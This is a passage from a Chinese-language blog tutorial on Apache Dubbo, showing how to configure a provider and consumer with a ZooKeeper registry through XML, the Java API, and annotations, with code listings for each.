class="attr">protocol</span>=<span class="string">&quot;registry&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--dubbo这个服务所要暴露的服务地址所对应的注册中心--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;dubbo:registry address=&quot;N/A&quot;/&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">address</span>=<span class="string">&quot;zookeeper://localhost:2181&quot;</span> <span class="attr">check</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--当前服务发布所依赖的协议；webservice、Thrift、Hessain、http--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">&quot;dubbo&quot;</span> <span class="attr">port</span>=<span class="string">&quot;20880&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--服务发布的配置，需要暴露的服务接口--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:service</span></span></span><br><span class="line"><span class="tag">            <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">ref</span>=<span class="string">&quot;providerService&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--Bean bean定义--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;providerService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderServiceImpl&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>重点关注这句话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dubbo:registry address=&quot;zookeeper://localhost:2181&quot; /&gt;</span><br></pre></td></tr></table></figure>
<p>在  <code>address</code>  中，使用我们的  <code>zookeeper</code>  的地址。</p>
<p>如果是 <code>zookeeper</code>  集群的话，使用下面的方式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dubbo:registry protocol=&quot;zookeeper&quot; address=&quot;192.168.11.129:2181,192.168.11.137:2181,192.168.11.138:2181&quot;/&gt;</span><br></pre></td></tr></table></figure>
<p>服务端的配置就好了，其他的跟 入门案例 一样。</p>
<h3 id="172-消费端"><a class="markdownIt-Anchor" href="#172-消费端">#</a> 1.7.2 消费端</h3>
<p>跟服务端一样，在消费端，我们也只需要修改  <code>consumer.xml</code>  即可。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:dubbo</span>=<span class="string">&quot;http://code.alibabatech.com/schema/dubbo&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans        http://www.springframework.org/schema/beans/spring-beans.xsd        http://code.alibabatech.com/schema/dubbo        http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--当前项目在整个分布式架构里面的唯一名称，计算依赖关系的标签--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:application</span> <span class="attr">name</span>=<span class="string">&quot;consumer&quot;</span> <span class="attr">owner</span>=<span class="string">&quot;sihai&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--dubbo这个服务所要暴露的服务地址所对应的注册中心--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--点对点的方式--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;dubbo:registry address=&quot;N/A&quot; /&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">address</span>=<span class="string">&quot;zookeeper://localhost:2181&quot;</span> <span class="attr">check</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--生成一个远程服务的调用代理--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--点对点方式--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;dubbo:reference id=&quot;providerService&quot;</span></span><br><span class="line"><span class="comment">                     interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span></span><br><span class="line"><span class="comment">                     url=&quot;dubbo://192.168.234.1:20880/com.sihai.dubbo.provider.service.ProviderService&quot;/&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">id</span>=<span class="string">&quot;providerService&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>1、注册中心配置跟服务端一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dubbo:registry address=&quot;zookeeper://localhost:2181&quot;/&gt;</span><br></pre></td></tr></table></figure>
<p>2、 <code>dubbo:reference</code> <br>
 由于我们这里使用  <code>zookeeper</code>  作为注册中心，所以，跟点对点的方式是不一样的，这里不再需要  <code>dubbo</code>  服务端提供的 url 了，只需要直接引用服务端提供的接口即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;dubbo:reference id=&quot;providerService&quot;</span><br><span class="line">                     interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot;/&gt;</span><br></pre></td></tr></table></figure>
<p>好了，消费端也配置好了，这样就可以使用修改的入门案例，重新启动运行了。</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/7a5a1b4a974a48ceb5aa80f1d516f5f4.png" alt="在这里插入图片描述"><br>
同样成功了。</p>
<p>这时候的区别在于，<strong>将  <code>dubbo</code>  发布的 <code>url</code>  注册到了  <code>zookeeper</code> ，消费端从  <code>zookeeper</code>  消费， <code>zookeeper</code>  相当于一个中介，给消费者提供服务</strong>。</p>
<p>你以为这就完了？不，好戏才刚刚开始呢。</p>
<h2 id="18-多种配置方式"><a class="markdownIt-Anchor" href="#18-多种配置方式">#</a> 1.8 多种配置方式</h2>
<p>在入门实例的时候，我们使用的是  <code>xml</code>  配置的方式，对  <code>dubbo</code>  的环境进行了配置，但是，官方还提供了其他的配置方式，这里我们也一一分解。</p>
<h3 id="181-api配置方式"><a class="markdownIt-Anchor" href="#181-api配置方式">#</a> 1.8.1  <code>API</code>  配置方式</h3>
<p>这种方式其实官方是不太推荐的，官方推荐使用 <code>xml</code>  配置的方式，但是，在有的时候测试的时候，还是可以用的到的，另外，为了保证完整性，这些内容还是有必要讲讲的。</p>
<p>首先还是回到服务端工程。</p>
<p><strong>服务端</strong><br>
<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/e0f491e8de154c93b814e9e87df52f54.png" alt="在这里插入图片描述"><br>
这里我们使用  <code>api</code>  的方式配置，所以， <code>provider.xml</code>  这个配置文件就暂时不需要了，我们只需要在上面的  <code>AppApi</code>  这个类中的  <code>main</code>  方法中用 <code>api</code>  配置及启动即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sihai.dubbo.provider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ApplicationConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ProtocolConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.RegistryConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ServiceConfig;</span><br><span class="line"><span class="keyword">import</span> com.sihai.dubbo.provider.service.ProviderService;</span><br><span class="line"><span class="keyword">import</span> com.sihai.dubbo.provider.service.ProviderServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Api方式启动</span></span><br><span class="line"><span class="comment"> * api的方式调用不需要其他的配置，只需要下面的代码即可。</span></span><br><span class="line"><span class="comment"> * 但是需要注意，官方建议：</span></span><br><span class="line"><span class="comment"> * Api方式用于测试用例使用，推荐xml的方式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppApi</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 服务实现</span></span><br><span class="line">        <span class="type">ProviderService</span> <span class="variable">providerService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProviderServiceImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当前应用配置</span></span><br><span class="line">        <span class="type">ApplicationConfig</span> <span class="variable">application</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApplicationConfig</span>();</span><br><span class="line">        application.setName(<span class="string">&quot;provider&quot;</span>);</span><br><span class="line">        application.setOwner(<span class="string">&quot;sihai&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 连接注册中心配置</span></span><br><span class="line">        <span class="type">RegistryConfig</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RegistryConfig</span>();</span><br><span class="line">        registry.setAddress(<span class="string">&quot;zookeeper://localhost:2181&quot;</span>);</span><br><span class="line"><span class="comment">//        registry.setUsername(&quot;aaa&quot;);</span></span><br><span class="line"><span class="comment">//        registry.setPassword(&quot;bbb&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 服务提供者协议配置</span></span><br><span class="line">        <span class="type">ProtocolConfig</span> <span class="variable">protocol</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProtocolConfig</span>();</span><br><span class="line">        protocol.setName(<span class="string">&quot;dubbo&quot;</span>);</span><br><span class="line">        protocol.setPort(<span class="number">20880</span>);</span><br><span class="line">        <span class="comment">//protocol.setThreads(200);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注意：ServiceConfig为重对象，内部封装了与注册中心的连接，</span></span><br><span class="line">        <span class="comment">//以及开启服务端口</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 服务提供者暴露服务配置</span></span><br><span class="line">        <span class="comment">// 此实例很重，封装了与注册中心的连接，请自行缓存，</span></span><br><span class="line">        <span class="comment">//否则可能造成内存和连接泄漏</span></span><br><span class="line">        ServiceConfig&lt;ProviderService&gt; service = <span class="keyword">new</span> <span class="title class_">ServiceConfig</span>&lt;ProviderService&gt;(); </span><br><span class="line">        service.setApplication(application);</span><br><span class="line">        <span class="comment">// 多个注册中心可以用setRegistries()</span></span><br><span class="line">        service.setRegistry(registry); </span><br><span class="line">        <span class="comment">// 多个协议可以用setProtocols()</span></span><br><span class="line">        service.setProtocol(protocol); </span><br><span class="line">        service.setInterface(ProviderService.class);</span><br><span class="line">        service.setRef(providerService);</span><br><span class="line">        service.setVersion(<span class="string">&quot;1.0.0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 暴露及注册服务</span></span><br><span class="line">        service.export();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析说明如下所示：</p>
<p>看到上面的代码是不是云里雾里，不要慌，我们通过对照  <code>xml</code>  的方式分析一下。</p>
<p><strong>registry 的 xml 方式</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dubbo:registry protocol=&quot;zookeeper&quot; address=&quot;localhost:2181&quot;/&gt;</span><br></pre></td></tr></table></figure>
<p><strong>API 的方式</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RegistryConfig</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RegistryConfig</span>();</span><br><span class="line">registry.setAddress(<span class="string">&quot;zookeeper://localhost:2181&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><code>dubbo:registry</code>  节点对应 <code>RegistryConfig</code>  ， <code>xml</code>  的属性对应  <code>API</code>  方式用  <code>set</code>  方法就可以了。对比之下，你就会发现，如果  <code>API</code>  的方式不熟悉，可以对照 <code>xml</code>  配置方式就可以。</p>
<p><strong>其他 API</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">org.apache.dubbo.config.ServiceConfig</span><br><span class="line">org.apache.dubbo.config.ReferenceConfig</span><br><span class="line">org.apache.dubbo.config.ProtocolConfig</span><br><span class="line">org.apache.dubbo.config.RegistryConfig</span><br><span class="line">org.apache.dubbo.config.MonitorConfig</span><br><span class="line">org.apache.dubbo.config.ApplicationConfig</span><br><span class="line">org.apache.dubbo.config.ModuleConfig</span><br><span class="line">org.apache.dubbo.config.ProviderConfig</span><br><span class="line">org.apache.dubbo.config.ConsumerConfig</span><br><span class="line">org.apache.dubbo.config.MethodConfig</span><br><span class="line">org.apache.dubbo.config.ArgumentConfig</span><br></pre></td></tr></table></figure>
<p>更详细的可以查看官方文档：</p>
<blockquote>
<p>http://<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=dubbo&amp;spm=1001.2101.3001.7020">dubbo</a>.apache.org/zh-cn…</p>
</blockquote>
<p>我们再看看我配置的消费端的 <code>Api</code>  方式。</p>
<p><strong>消费端</strong><br>
同样，我们不需要  <code>consumer.xml</code>  配置文件了，只需要在  <code>main</code>  方法中启动即可。</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/99006e3f58d0417dbf27fa7068633b05.png" alt="在这里插入图片描述"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sihai.dubbo.consumer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ApplicationConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ReferenceConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.RegistryConfig;</span><br><span class="line"><span class="keyword">import</span> com.sihai.dubbo.provider.service.ProviderService;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * api的方式调用</span></span><br><span class="line"><span class="comment"> * api的方式调用不需要其他的配置，只需要下面的代码即可。</span></span><br><span class="line"><span class="comment"> * 但是需要注意，官方建议：</span></span><br><span class="line"><span class="comment"> * Api方式用于测试用例使用，推荐xml的方式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppApi</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 当前应用配置</span></span><br><span class="line">        <span class="type">ApplicationConfig</span> <span class="variable">application</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApplicationConfig</span>();</span><br><span class="line">        application.setName(<span class="string">&quot;consumer&quot;</span>);</span><br><span class="line">        application.setOwner(<span class="string">&quot;sihai&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 连接注册中心配置</span></span><br><span class="line">        <span class="type">RegistryConfig</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RegistryConfig</span>();</span><br><span class="line">        registry.setAddress(<span class="string">&quot;zookeeper://localhost:2181&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注意：ReferenceConfig为重对象，内部封装了与注册中心的连接，</span></span><br><span class="line">        <span class="comment">//以及与服务提供方的连接</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 引用远程服务</span></span><br><span class="line">        ReferenceConfig&lt;ProviderService&gt; reference = <span class="keyword">new</span> <span class="title class_">ReferenceConfig</span>&lt;ProviderService&gt;(); <span class="comment">// 此实例很重，封装了与注册中心的连接以及与提供者的连接，请自行缓存，否则可能造成内存和连接泄漏</span></span><br><span class="line">        reference.setApplication(application);</span><br><span class="line">        reference.setRegistry(registry); <span class="comment">// 多个注册中心可以用setRegistries()</span></span><br><span class="line">        reference.setInterface(ProviderService.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 和本地bean一样使用xxxService</span></span><br><span class="line">        <span class="type">ProviderService</span> <span class="variable">providerService</span> <span class="operator">=</span> reference.get(); <span class="comment">// 注意：此代理对象内部封装了所有通讯细节，对象较重，请缓存复用</span></span><br><span class="line">        providerService.SayHello(<span class="string">&quot;hello dubbo! I am sihai!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这部分的  <code>API</code>  配置的方式就到这了，注意：官方推荐  <code>xml</code>  的配置方法</p>
<h3 id="182-注解配置方式"><a class="markdownIt-Anchor" href="#182-注解配置方式">#</a> 1.8.2 注解配置方式</h3>
<p>注解配置方式还是需要了解一下的，现在微服务都倾向于这种方式，这也是以后发展的趋势， <code>0</code>  配置应该是这几年的趋势。</p>
<p>那么如何对 <code>dubbo</code>  使用注解的方式呢？我们先看服务端。</p>
<p><strong>服务端</strong><br>
<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/1ad33df6d381480793d65ee4212b5ea6.png" alt="在这里插入图片描述"><br>
<strong>第一步：定义接口及实现类，在上面的截图中的  <code>annotation</code>  包下</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sihai.dubbo.provider.service.annotation;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注解方式接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ProviderServiceAnnotation</span> &#123;</span><br><span class="line">    String <span class="title function_">SayHelloAnnotation</span><span class="params">(String word)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sihai.dubbo.provider.service.annotation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.annotation.Service;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注解方式实现类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service(timeout = 5000)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProviderServiceImplAnnotation</span> <span class="keyword">implements</span> <span class="title class_">ProviderServiceAnnotation</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">SayHelloAnnotation</span><span class="params">(String word)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>@Service</strong></p>
<p><code>@Service</code>  用来配置  <code>Dubbo</code>  的服务提供方。</p>
<p><strong>第二步：组装服务提供方</strong>。通过  <code>Spring</code>  中  <code>Java Config</code>  的技术（ <code>@Configuration</code> ）和  <code>annotation</code>  扫描（ <code>@EnableDubbo</code> ）来发现、组装、并向外提供 <code>Dubbo</code>  的服务。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sihai.dubbo.provider.configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ApplicationConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ProtocolConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ProviderConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.RegistryConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.spring.context.annotation.EnableDubbo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注解方式配置</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableDubbo(scanBasePackages = &quot;com.sihai.dubbo.provider.service.annotation&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DubboConfiguration</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span> <span class="comment">// #1 服务提供者信息配置</span></span><br><span class="line">    <span class="keyword">public</span> ProviderConfig <span class="title function_">providerConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ProviderConfig</span> <span class="variable">providerConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProviderConfig</span>();</span><br><span class="line">        providerConfig.setTimeout(<span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">return</span> providerConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span> <span class="comment">// #2 分布式应用信息配置</span></span><br><span class="line">    <span class="keyword">public</span> ApplicationConfig <span class="title function_">applicationConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ApplicationConfig</span> <span class="variable">applicationConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApplicationConfig</span>();</span><br><span class="line">        applicationConfig.setName(<span class="string">&quot;dubbo-annotation-provider&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> applicationConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span> <span class="comment">// #3 注册中心信息配置</span></span><br><span class="line">    <span class="keyword">public</span> RegistryConfig <span class="title function_">registryConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">RegistryConfig</span> <span class="variable">registryConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RegistryConfig</span>();</span><br><span class="line">        registryConfig.setProtocol(<span class="string">&quot;zookeeper&quot;</span>);</span><br><span class="line">        registryConfig.setAddress(<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line">        registryConfig.setPort(<span class="number">2181</span>);</span><br><span class="line">        <span class="keyword">return</span> registryConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span> <span class="comment">// #4 使用协议配置，这里使用 dubbo</span></span><br><span class="line">    <span class="keyword">public</span> ProtocolConfig <span class="title function_">protocolConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ProtocolConfig</span> <span class="variable">protocolConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProtocolConfig</span>();</span><br><span class="line">        protocolConfig.setName(<span class="string">&quot;dubbo&quot;</span>);</span><br><span class="line">        protocolConfig.setPort(<span class="number">20880</span>);</span><br><span class="line">        <span class="keyword">return</span> protocolConfig;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析说明如下：<br>
1、通过  <code>@EnableDubbo</code>  指定在 <code>com.sihai.dubbo.provider.service.annotation</code>  下扫描所有标注有  <code>@Service</code>  的类</p>
<p>2、通过  <code>@Configuration</code>  将  <code>DubboConfiguration</code>  中所有的  <code>@Bean</code>  通过 <code>Java Config</code>  的方式组装出来并注入给  <code>Dubbo</code>  服务，也就是标注有 <code>@Service</code>  的类。</p>
<p>这其中就包括了：</p>
